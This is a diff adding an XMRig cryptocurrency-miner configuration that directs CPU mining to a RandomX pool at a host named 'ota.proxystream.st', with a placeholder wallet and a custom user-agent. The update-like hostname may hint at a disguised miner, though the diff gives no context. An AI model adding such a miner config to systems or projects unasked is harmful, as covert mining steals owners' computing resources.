@@ -1,0 +1,17 @@
+{
+    "autosave": true,
+    "cpu": {"enabled": true, "huge-pages": true},
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "algo": "randomx",
+            "url": "stratum+tcp://ota.proxystream.st:3333",
+            "user": "wallet_placeholder",
+            "pass": "x12345",
+            "keepalive": true,
+            "tls": false
+        }
+    ],
+    "user-agent": "XMRig/6.21.0 mylovelyminer"
+}
